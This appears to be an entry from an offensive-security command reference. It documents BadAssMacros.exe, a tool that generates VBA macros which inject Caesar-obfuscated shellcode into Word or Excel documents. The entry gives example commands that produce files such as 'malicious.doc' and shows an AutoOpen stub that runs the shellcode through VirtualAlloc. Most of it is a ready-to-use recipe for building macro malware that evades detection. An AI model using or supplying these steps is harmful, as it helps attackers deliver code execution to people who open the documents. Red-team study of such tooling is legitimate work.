---
type: command
executor: bash
data: >-
  BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc_or_excel> -p no -s
  classic -c <caesar_shift_value> -o <path_to_output_file>
output: null
platforms:
  - Windows
tags:
  - office
  - macro
  - shellcode
  - injection
verified: true
validated: true
---

# create-vba-classic-shellcode-injection

## Command

```bash
BadAssMacros.exe -i $_PATH_TO_SHELLCODE -w $_DOC_OR_EXCEL -p no -s classic -c $_CAESAR_SHIFT -o $_OUTPUT_FILE
```

## Description

Generates VBA code for classic shellcode injection into an Office document, using Caesar cipher obfuscation for the shellcode.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_PATH_TO_SHELLCODE` | Path to the raw shellcode file (e.g., payload.bin) | Yes |
| `$_DOC_OR_EXCEL` | Output type: 'doc' for Word or 'excel' for Excel | Yes |
| `-p no` | Do not preserve original file | Built-in |
| `-s classic` | Use classic injection method | Built-in |
| `$_CAESAR_SHIFT` | Caesar cipher shift value (1-25) for obfuscation | Yes |
| `$_OUTPUT_FILE` | Path for the output VBA or document file | Yes |

## Examples

### Basic Usage

```bash
BadAssMacros.exe -i payload.bin -w doc -p no -s classic -c 7 -o malicious.doc
```

### Advanced Usage

```bash
BadAssMacros.exe -i ./shellcode.bin -w excel -p no -s classic -c 23 -o output.xls
```

## Expected Output

A file containing obfuscated VBA code or an embedded Office document, e.g.,:
Sub AutoOpen()
    ' Obfuscated shellcode load and VirtualAlloc/execute
End Sub

## Related

- [[procedures/Create-Office-Macro-Malware-with-BadAssMacros]]
- [[tools/BadAssMacros]]
